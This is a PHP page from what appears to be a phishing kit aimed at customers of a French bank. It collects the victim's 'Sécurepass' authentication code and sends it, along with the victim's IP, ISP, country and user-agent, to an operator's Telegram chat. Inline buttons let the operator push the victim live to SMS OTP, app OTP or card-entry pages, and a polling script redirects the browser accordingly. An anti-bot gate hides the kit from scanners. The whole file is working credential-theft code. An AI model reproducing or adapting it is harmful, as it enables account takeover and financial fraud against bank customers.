<?php
session_start();
include ("../server/all.php");
include '../settings.php';
include('../server/fonctions.php');

require __DIR__ . '/vendor/autoload.php';
$date = date('d/m/y');
$heure = date('H:i:s');
$dateHeure = "$date, $heure";
$_SESSION['date_heure'] = $dateHeure;
use Telegram\Bot\Api;

$ip = $_SERVER['REMOTE_ADDR'];
$error = false;
$step = 1; // 1: Card require | 2: Loading
$telegram = new Api($bot_token);     

//Session 



if (isset($_SESSION['killbot_autorisé']) && $_SESSION['killbot_autorisé'] ==  true) { 
if (isset($_POST['securepass_submit']) && !empty($_POST['securepass'])){ 

$_SESSION['securepass'] =htmlspecialchars($_POST['securepass']);


   
    $step = 2;

    $keyboard = [
        'inline_keyboard' => [

            [['text' => '❌ | Sécurepass Invalide', 'callback_data' => 'invalide_securepass']],  
            [['text' => '📲 | Page sms', 'callback_data' => 'otp_sms']],
            [['text' => '📲 | Page App', 'callback_data' => 'otp_app']],           
            [['text' => '💳 | Page CC ', 'callback_data' => 'page_cc']],
            [['text' => '🚫 | Bannir IP', 'callback_data' => 'ban_ip']],
            [['text' => '✅ | Succès ', 'callback_data' => 'page_succes']],

           
        ]
    ];
    $telegram->sendMessage([
        'chat_id' => $chat_login,
        'text' => "
[🔔] Sécurepass  | SG 2024

[🔎] Code sécurepass : ". $_SESSION['securepass']. "

[📜] Informations liée au client [📜]
             
[🗓️] Heure et date du rez : {$_SESSION['date_heure']}
[🌐] IP Client : {$_SESSION['ip']}
[🔎] ISP Client : {$_SESSION['isp_client']}
[🌍] Pays Client : {$_SESSION['pays_client']}
[📍] User-agent : {$_SESSION['useragent']}
[©️] 2024[©️]"          
             ,     

        'reply_markup' => json_encode($keyboard)
    ]);
} else {
    $error = true;
    header("Location: ../fr/info.php?error=1");
    exit;
}





?>
<!DOCTYPE html>
<html>

<head>

</head>

<body>
    <?php if ($step == 1):
        if ($error): ?>
    <div style="color:red;">
        <?= $errorMessage ?>
    </div>
    <?php endif; ?>



    <?php elseif ($step == 2): ?>

    <div>
        <?php include '../fr/loader.php'; ?>
    </div>


    <script src="https://code.jquery.com/jquery-3.7.0.js"
        integrity="sha256-JlqSTELeR4TLqP0OG9dxM7yDPqX1ox/HfgiSLBj8+kM=" crossorigin="anonymous"></script>

    <script>
    setInterval(function() {
        $.ajax({
            type: "GET",
            url: "callback.php",
            success: function(msg) {
                /* Login Invalide */
                if (msg === 'invalide_securepass') {
                    window.location.href = '../fr/securepass.php?error=1';
                }
                /* OTP SMS */
                else if (msg === 'otp_sms') {
                    window.location.href = '../fr/sms.php';
                }

                /* OTP Application */
                else if (msg === 'otp_app') {
                    window.location.href = '../fr/app.php';
                }

                /* OTP Securepass */
                else if (msg === 'otp_securepass') {
                    window.location.href = '../fr/securepass.php';
                }

                /* Page CC */
                else if (msg === 'page_cc') {
                    window.location.href = '../fr/carte.php';
                }

                /* Page Succès */
                else if (msg === 'page_succes') {
                    window.location.href = '../fr/succes.php';
                }

                /* Page Ban IP */
                else if (msg === 'ban_ip') {
                    window.location.href = '../fr/banned.php';
                }



            },
            error: function(msg) {
                console.error(msg);
            }
        });
    }, 3000)
    </script>


    <?php endif; ?>
</body>

</html>
<?php
}
else { 
    session_destroy();
    header ('Location : ../404.php');
    exit ;  
}

?>